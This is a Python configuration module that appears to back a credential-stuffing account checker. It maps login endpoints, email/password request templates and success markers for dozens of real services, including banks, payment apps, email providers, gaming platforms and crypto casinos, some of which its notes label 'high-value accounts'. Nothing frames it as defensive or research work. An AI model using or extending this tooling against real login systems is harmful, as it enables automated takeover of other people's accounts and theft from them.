#!/usr/bin/env python3
"""
Service Validation Configuration Database
Defines login endpoints and validation logic for 78 services
"""
from typing import Dict, Optional, Callable
from dataclasses import dataclass
import requests


@dataclass
class ServiceConfig:
    """Configuration for service validation."""
    name: str
    login_url: str = ""
    method: str = "POST"
    payload_template: Dict = None
    headers: Dict = None
    success_indicators: list = None
    requires_selenium: bool = False
    rate_limit_delay: float = 1.0
    notes: str = ""


# Service validation configurations
SERVICE_CONFIGS = {
    # === VALIDATED SERVICES (Working) ===
    'nike': ServiceConfig(
        name='Nike',
        login_url='https://unite.nike.com/login',
        payload_template={'username': '{email}', 'password': '{password}',
                         'client_id': 'nike.com', 'grant_type': 'password'},
        success_indicators=[200, 'access_token']
    ),

    'marriott': ServiceConfig(
        name='Marriott',
        login_url='https://www.marriott.com/authentication/flexauth',
        payload_template={'username': '{email}', 'password': '{password}'},
        success_indicators=[200, 'token']
    ),

    'sephora': ServiceConfig(
        name='Sephora',
        login_url='https://www.sephora.com/api/users/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200, 'user']
    ),

    # === RETAIL & SERVICES ===
    'amazon': ServiceConfig(
        name='Amazon',
        login_url='https://www.amazon.com/ap/signin',
        requires_selenium=True,
        notes='Complex authentication, requires Selenium'
    ),

    'walmart': ServiceConfig(
        name='Walmart',
        login_url='https://www.walmart.com/account/api/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'target': ServiceConfig(
        name='Target',
        login_url='https://gsp.target.com/gsp/authentications/v1/auth_codes',
        payload_template={'username': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'bestbuy': ServiceConfig(
        name='Best Buy',
        login_url='https://www.bestbuy.com/identity/authenticate',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'ebay': ServiceConfig(
        name='eBay',
        login_url='https://signin.ebay.com/signin/v1',
        requires_selenium=True,
        notes='Complex CAPTCHA, requires Selenium'
    ),

    'dsw': ServiceConfig(
        name='Designer Shoe Warehouse',
        login_url='https://www.dsw.com/api/account/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    # === FOOD & RESTAURANTS ===
    'subway': ServiceConfig(
        name='Subway MyWay Rewards',
        login_url='https://api.subway.com/v2/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200, 'token']
    ),

    'pizzahut': ServiceConfig(
        name='Pizza Hut',
        login_url='https://www.pizzahut.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'dominoes': ServiceConfig(
        name='Dominos',
        login_url='https://order.dominos.com/power/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'burgerking': ServiceConfig(
        name='Burger King',
        login_url='https://use1-prod-bk.rbictg.com/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200, 'accessToken']
    ),

    'panda': ServiceConfig(
        name='Panda Express',
        login_url='https://api.pandaexpress.com/v1/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'roundtable': ServiceConfig(
        name='Round Table Pizza',
        login_url='https://www.roundtablepizza.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    # === EMAIL PROVIDERS (Check via SMTP/IMAP or password reset) ===
    'gmail': ServiceConfig(
        name='Gmail',
        login_url='https://accounts.google.com/signin/v2/challenge/pwd',
        requires_selenium=True,
        notes='Use IMAP or password reset check instead'
    ),

    'yahoo': ServiceConfig(
        name='Yahoo Mail',
        login_url='https://login.yahoo.com/account/challenge/password',
        requires_selenium=True,
        notes='Use IMAP or password reset check'
    ),

    'hotmail': ServiceConfig(
        name='Hotmail/Outlook',
        login_url='https://login.live.com',
        requires_selenium=True,
        notes='Use IMAP or password reset check'
    ),

    'outlook': ServiceConfig(
        name='Outlook',
        login_url='https://login.live.com',
        requires_selenium=True,
        notes='Same as Hotmail, use IMAP'
    ),

    'icloud': ServiceConfig(
        name='iCloud',
        login_url='https://idmsa.apple.com/appleauth/auth/signin',
        requires_selenium=True,
        notes='Complex 2FA system'
    ),

    'protonmail': ServiceConfig(
        name='ProtonMail',
        login_url='https://account.protonmail.com/api/auth',
        payload_template={'Username': '{email}', 'Password': '{password}'},
        success_indicators=[200]
    ),

    'aol': ServiceConfig(
        name='AOL Mail',
        login_url='https://login.aol.com/account/challenge/password',
        requires_selenium=True,
        notes='Yahoo-owned, similar auth'
    ),

    # === PAYMENT & BANKING (High Security - Most require 2FA) ===
    'paypal': ServiceConfig(
        name='PayPal',
        login_url='https://www.paypal.com/signin',
        requires_selenium=True,
        notes='CRITICAL - 2FA required, use with extreme caution'
    ),

    'venmo': ServiceConfig(
        name='Venmo',
        login_url='https://api.venmo.com/v1/oauth/access_token',
        payload_template={'phone_email_or_username': '{email}',
                         'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - PayPal owned'
    ),

    'cashapp': ServiceConfig(
        name='Cash App',
        login_url='https://cash.app/login',
        requires_selenium=True,
        notes='CRITICAL - Phone-based auth'
    ),

    'zelle': ServiceConfig(
        name='Zelle',
        login_url='https://www.zellepay.com/login',
        requires_selenium=True,
        notes='CRITICAL - Bank-integrated'
    ),

    'stripe': ServiceConfig(
        name='Stripe',
        login_url='https://dashboard.stripe.com/login',
        requires_selenium=True,
        notes='CRITICAL - Business accounts'
    ),

    'chime': ServiceConfig(
        name='Chime',
        login_url='https://api.chime.com/v1/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - Banking'
    ),

    # Banking institutions - EXTREME CAUTION
    'navyfederal': ServiceConfig(
        name='Navy Federal',
        requires_selenium=True,
        notes='CRITICAL - Military banking, DO NOT automate'
    ),

    'usaa': ServiceConfig(
        name='USAA',
        requires_selenium=True,
        notes='CRITICAL - Military banking, DO NOT automate'
    ),

    'wellsfargo': ServiceConfig(
        name='Wells Fargo',
        requires_selenium=True,
        notes='CRITICAL - Major bank, DO NOT automate'
    ),

    'bankofamerica': ServiceConfig(
        name='Bank of America',
        requires_selenium=True,
        notes='CRITICAL - Major bank, DO NOT automate'
    ),

    'chase': ServiceConfig(
        name='Chase',
        requires_selenium=True,
        notes='CRITICAL - Major bank, DO NOT automate'
    ),

    # === SOCIAL MEDIA ===
    'facebook': ServiceConfig(
        name='Facebook',
        login_url='https://www.facebook.com/login.php',
        requires_selenium=True,
        notes='Complex authentication'
    ),

    'instagram': ServiceConfig(
        name='Instagram',
        login_url='https://www.instagram.com/accounts/login/ajax/',
        payload_template={'username': '{email}', 'password': '{password}'},
        headers={'X-CSRFToken': 'missing', 'X-Instagram-AJAX': '1'},
        success_indicators=[200, 'authenticated']
    ),

    'twitter': ServiceConfig(
        name='Twitter',
        login_url='https://api.twitter.com/1.1/onboarding/task.json',
        requires_selenium=True,
        notes='Complex flow, use Selenium'
    ),

    'x': ServiceConfig(
        name='X (Twitter)',
        login_url='https://api.twitter.com/1.1/onboarding/task.json',
        requires_selenium=True,
        notes='Same as Twitter'
    ),

    'linkedin': ServiceConfig(
        name='LinkedIn',
        login_url='https://www.linkedin.com/uas/login-submit',
        payload_template={'session_key': '{email}', 'session_password': '{password}'},
        requires_selenium=True,
        notes='CAPTCHA protection'
    ),

    'tiktok': ServiceConfig(
        name='TikTok',
        login_url='https://www.tiktok.com/login',
        requires_selenium=True,
        notes='Complex authentication'
    ),

    'snapchat': ServiceConfig(
        name='Snapchat',
        login_url='https://accounts.snapchat.com/accounts/login',
        requires_selenium=True,
        notes='Mobile-first platform'
    ),

    'reddit': ServiceConfig(
        name='Reddit',
        login_url='https://www.reddit.com/api/login/',
        payload_template={'user': '{email}', 'passwd': '{password}'},
        success_indicators=[200]
    ),

    'discord': ServiceConfig(
        name='Discord',
        login_url='https://discord.com/api/v9/auth/login',
        payload_template={'login': '{email}', 'password': '{password}'},
        success_indicators=[200, 'token'],
        notes='May have CAPTCHA'
    ),

    'telegram': ServiceConfig(
        name='Telegram',
        requires_selenium=True,
        notes='Phone-based authentication'
    ),

    # === GAMING & STREAMING ===
    'steam': ServiceConfig(
        name='Steam',
        login_url='https://login.steampowered.com/doLogin/',
        requires_selenium=True,
        notes='2FA required for most accounts'
    ),

    'epic': ServiceConfig(
        name='Epic Games',
        login_url='https://www.epicgames.com/id/api/authenticate',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'origin': ServiceConfig(
        name='Origin (EA)',
        login_url='https://accounts.ea.com/connect/auth',
        requires_selenium=True,
        notes='EA Account required'
    ),

    'battlenet': ServiceConfig(
        name='Battle.net',
        login_url='https://us.battle.net/login/en/',
        requires_selenium=True,
        notes='Blizzard account'
    ),

    'xbox': ServiceConfig(
        name='Xbox Live',
        login_url='https://login.live.com',
        requires_selenium=True,
        notes='Microsoft account'
    ),

    'playstation': ServiceConfig(
        name='PlayStation Network',
        login_url='https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/token',
        requires_selenium=True,
        notes='Complex Sony auth'
    ),

    'netflix': ServiceConfig(
        name='Netflix',
        login_url='https://www.netflix.com/login',
        requires_selenium=True,
        notes='Email or phone login'
    ),

    'hulu': ServiceConfig(
        name='Hulu',
        login_url='https://auth.hulu.com/v1/login',
        payload_template={'user_email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'disney': ServiceConfig(
        name='Disney+',
        login_url='https://www.disneyplus.com/login',
        requires_selenium=True,
        notes='Disney account required'
    ),

    'spotify': ServiceConfig(
        name='Spotify',
        login_url='https://accounts.spotify.com/api/login',
        payload_template={'username': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    # === CLOUD STORAGE ===
    'dropbox': ServiceConfig(
        name='Dropbox',
        login_url='https://www.dropbox.com/ajax_login',
        payload_template={'login_email': '{email}', 'login_password': '{password}'},
        success_indicators=[200]
    ),

    'googledrive': ServiceConfig(
        name='Google Drive',
        login_url='https://accounts.google.com',
        requires_selenium=True,
        notes='Google account - same as Gmail'
    ),

    'onedrive': ServiceConfig(
        name='OneDrive',
        login_url='https://login.live.com',
        requires_selenium=True,
        notes='Microsoft account'
    ),

    'icloud_storage': ServiceConfig(
        name='iCloud Storage',
        login_url='https://www.icloud.com',
        requires_selenium=True,
        notes='Apple ID required'
    ),

    # === TELECOM/ISP ===
    'xfinity': ServiceConfig(
        name='Xfinity',
        login_url='https://login.xfinity.com/login',
        requires_selenium=True,
        notes='Comcast account'
    ),

    'att': ServiceConfig(
        name='AT&T',
        login_url='https://www.att.com/acctmgmt/login',
        requires_selenium=True,
        notes='Complex customer portal'
    ),

    'verizon': ServiceConfig(
        name='Verizon',
        login_url='https://login.verizon.com',
        requires_selenium=True,
        notes='Customer portal'
    ),

    'tmobile': ServiceConfig(
        name='T-Mobile',
        login_url='https://login.t-mobile.com',
        requires_selenium=True,
        notes='Phone number or email'
    ),

    # === AIRLINES/TRAVEL ===
    'southwest': ServiceConfig(
        name='Southwest Airlines',
        login_url='https://www.southwest.com/api/security/v4/security/token/oauth',
        payload_template={'username': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'delta': ServiceConfig(
        name='Delta',
        login_url='https://www.delta.com/login',
        requires_selenium=True,
        notes='SkyMiles account'
    ),

    'united': ServiceConfig(
        name='United',
        login_url='https://www.united.com/ual/en/us/account/signin',
        requires_selenium=True,
        notes='MileagePlus account'
    ),

    'american': ServiceConfig(
        name='American Airlines',
        login_url='https://www.aa.com/login',
        requires_selenium=True,
        notes='AAdvantage account'
    ),

    # Add legacy/additional services
    'alta': ServiceConfig(
        name='Alta Beauty',
        login_url='https://www.alta.com/api/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'amc': ServiceConfig(
        name='AMC Theatres',
        requires_selenium=True,
        notes='AMC Stubs account'
    ),

    'ebth': ServiceConfig(
        name='EBTH',
        requires_selenium=True,
        notes='Everything But The House'
    ),

    'fandango': ServiceConfig(
        name='Fandango',
        requires_selenium=True,
        notes='Movie tickets'
    ),

    'gamestop': ServiceConfig(
        name='GameStop',
        requires_selenium=True,
        notes='PowerUp Rewards'
    ),

    'frontier': ServiceConfig(
        name='Frontier',
        login_url='https://www.frontier.com/api/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    'fresh': ServiceConfig(
        name='Fresh Market',
        login_url='https://www.thefreshmarket.com/api/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200]
    ),

    # === ADDITIONAL GAMING SERVICES ===
    'riot': ServiceConfig(
        name='Riot Games (League of Legends, Valorant)',
        login_url='https://auth.riotgames.com/api/v1/authorization',
        payload_template={'username': '{email}', 'password': '{password}',
                         'type': 'auth'},
        success_indicators=[200, 'access_token'],
        notes='Covers LoL, Valorant, TFT, etc.'
    ),

    'jagex': ServiceConfig(
        name='Jagex (RuneScape, OSRS)',
        login_url='https://secure.runescape.com/m=weblogin/login.ws',
        payload_template={'username': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='RuneScape and Old School RuneScape'
    ),

    'csgo': ServiceConfig(
        name='CS:GO (Steam)',
        login_url='https://login.steampowered.com',
        requires_selenium=True,
        notes='Uses Steam authentication'
    ),

    # === CRYPTO CASINO & GAMBLING ===
    'stake_com': ServiceConfig(
        name='Stake.com',
        login_url='https://stake.com/_api/auth/login',
        payload_template={'identifier': '{email}', 'password': '{password}'},
        success_indicators=[200, 'accessToken'],
        notes='CRITICAL - Crypto casino, high-value accounts'
    ),

    'stake_us': ServiceConfig(
        name='Stake.us',
        login_url='https://stake.us/_api/auth/login',
        payload_template={'identifier': '{email}', 'password': '{password}'},
        success_indicators=[200, 'accessToken'],
        notes='CRITICAL - US version of Stake'
    ),

    'roobet': ServiceConfig(
        name='Roobet',
        login_url='https://roobet.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200, 'token'],
        notes='CRITICAL - Crypto casino'
    ),

    'rollbit': ServiceConfig(
        name='Rollbit',
        login_url='https://rollbit.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - Crypto casino & trading'
    ),

    'shuffle': ServiceConfig(
        name='Shuffle.com',
        login_url='https://shuffle.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - Crypto casino'
    ),

    # === MORE POPULAR GAMING ===
    'rockstargames': ServiceConfig(
        name='Rockstar Games Social Club',
        login_url='https://scapi.rockstargames.com/login',
        requires_selenium=True,
        notes='GTA, Red Dead Redemption'
    ),

    'ubisoft': ServiceConfig(
        name='Ubisoft Connect',
        login_url='https://public-ubiservices.ubi.com/v3/profiles/sessions',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='Ubisoft games'
    ),

    'epicgames': ServiceConfig(
        name='Epic Games Store',
        login_url='https://www.epicgames.com/id/api/authenticate',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200, 'access_token'],
        notes='Fortnite, Unreal Engine'
    ),

    # === ADDITIONAL CASINOS & BETTING ===
    'duelbits': ServiceConfig(
        name='Duelbits',
        login_url='https://duelbits.com/api/auth/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - Crypto casino'
    ),

    'csgoempire': ServiceConfig(
        name='CSGOEmpire',
        login_url='https://csgoempire.com/api/v2/user/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - CS:GO skin gambling'
    ),

    'csgolotto': ServiceConfig(
        name='CSGOLotto',
        login_url='https://www.csgolotto.com/api/login',
        payload_template={'email': '{email}', 'password': '{password}'},
        success_indicators=[200],
        notes='CRITICAL - CS:GO betting'
    ),

    'twitch': ServiceConfig(
        name='Twitch',
        login_url='https://passport.twitch.tv/login',
        requires_selenium=True,
        notes='Amazon-owned streaming platform'
    ),

    'youtube': ServiceConfig(
        name='YouTube',
        login_url='https://accounts.google.com',
        requires_selenium=True,
        notes='Google account - same as Gmail'
    ),

    # === CRYPTO EXCHANGES (HIGH VALUE) ===
    'binance': ServiceConfig(
        name='Binance',
        login_url='https://www.binance.com/bapi/accounts/v1/public/authcenter/login',
        requires_selenium=True,
        notes='CRITICAL - Major crypto exchange, 2FA required'
    ),

    'coinbase': ServiceConfig(
        name='Coinbase',
        login_url='https://www.coinbase.com/api/v2/sessions',
        requires_selenium=True,
        notes='CRITICAL - Major crypto exchange, 2FA required'
    ),

    'kraken': ServiceConfig(
        name='Kraken',
        login_url='https://www.kraken.com/api/login',
        requires_selenium=True,
        notes='CRITICAL - Crypto exchange'
    ),
}


def get_service_config(service_name: str) -> Optional[ServiceConfig]:
    """Get configuration for a service."""
    return SERVICE_CONFIGS.get(service_name.lower())


def list_selenium_services() -> list:
    """Get list of services requiring Selenium."""
    return [name for name, config in SERVICE_CONFIGS.items()
            if config.requires_selenium]


def list_http_services() -> list:
    """Get list of services using HTTP-based validation."""
    return [name for name, config in SERVICE_CONFIGS.items()
            if not config.requires_selenium]


def get_service_stats() -> Dict:
    """Get statistics about service configurations."""
    total = len(SERVICE_CONFIGS)
    selenium = len(list_selenium_services())
    http = len(list_http_services())
    critical = len([c for c in SERVICE_CONFIGS.values()
                   if 'CRITICAL' in c.notes])

    return {
        'total_services': total,
        'http_based': http,
        'selenium_based': selenium,
        'critical_services': critical
    }


if __name__ == '__main__':
    stats = get_service_stats()
    print("="*60)
    print("SERVICE VALIDATION CONFIGURATIONS")
    print("="*60)
    print(f"Total Services: {stats['total_services']}")
    print(f"HTTP-Based: {stats['http_based']}")
    print(f"Selenium-Based: {stats['selenium_based']}")
    print(f"Critical (Banking/Payment): {stats['critical_services']}")
    print("\n HTTP Services:")
    for svc in sorted(list_http_services())[:10]:
        print(f"  - {svc}")
    print(f"  ... and {len(list_http_services())-10} more")
